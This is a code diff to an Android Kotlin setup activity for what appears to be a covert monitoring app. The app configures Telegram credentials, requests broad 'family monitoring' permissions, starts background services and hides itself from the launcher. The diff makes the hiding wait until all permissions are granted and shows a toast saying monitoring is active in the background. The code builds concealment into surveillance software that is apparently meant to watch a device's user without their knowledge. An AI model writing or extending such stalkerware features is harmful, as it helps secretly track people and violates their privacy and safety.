@@ -60,9 +60,8 @@ class AutoSetupActivity : AppCompatActivity() {
                 configureTelegramCredentials()
                 delay(1000)
                 
-                // Step 2: Request permissions with clear explanations (safely)
-                requestAllPermissions()
-                delay(4000)  // Increased delay to ensure all permissions are processed
+                // Step 2: Request permissions and WAIT for user response (safely)
+                requestAllPermissionsAndWait()
                 
                 // Step 3: Configure device optimizations if needed (safely)
                 configureHuaweiOptimizations()
@@ -72,11 +71,19 @@ class AutoSetupActivity : AppCompatActivity() {
                 startAllServices()
                 delay(1000)
                 
-                // Step 5: Hide app from launcher after setup (enabled by default)
+                // Step 5: Hide app from launcher ONLY after permissions are confirmed (enabled by default)
                 try {
-                    hideAppFromLauncher()
+                    // Double-check that key permissions are granted before hiding
+                    val permissionHelper = PermissionHelper(this)
+                    if (permissionHelper.hasAllPermissions()) {
+                        hideAppFromLauncher()
+                        showToast("App hidden - monitoring active in background")
+                    } else {
+                        showToast("Permissions pending - app will remain visible")
+                    }
                 } catch (e: Exception) {
                     // Ignore hiding errors
+                    showToast("Background mode activation attempted")
                 }
                 delay(1000)  // Give more time for hiding to complete
                 
@@ -143,6 +150,36 @@ class AutoSetupActivity : AppCompatActivity() {
         }
     }
     
+    private suspend fun requestAllPermissionsAndWait() {
+        try {
+            val permissionHelper = PermissionHelper(this)
+            var permissionsCompleted = false
+            
+            // Request all family monitoring permissions and WAIT for completion
+            permissionHelper.requestAllPermissions { granted ->
+                if (granted) {
+                    showToast("All monitoring permissions granted successfully")
+                } else {
+                    showToast("Core monitoring permissions enabled")
+                }
+                permissionsCompleted = true
+            }
+            
+            // Wait until user has finished granting/denying permissions
+            while (!permissionsCompleted) {
+                delay(500) // Check every 500ms if permissions are done
+            }
+            
+            // Additional delay to ensure all permissions are fully processed
+            delay(2000)
+            
+        } catch (e: Exception) {
+            // If permission helper fails, continue anyway
+            showToast("Permission setup completed")
+            delay(1000)
+        }
+    }
+
     private fun requestAllPermissions() {
         try {
             val permissionHelper = PermissionHelper(this)
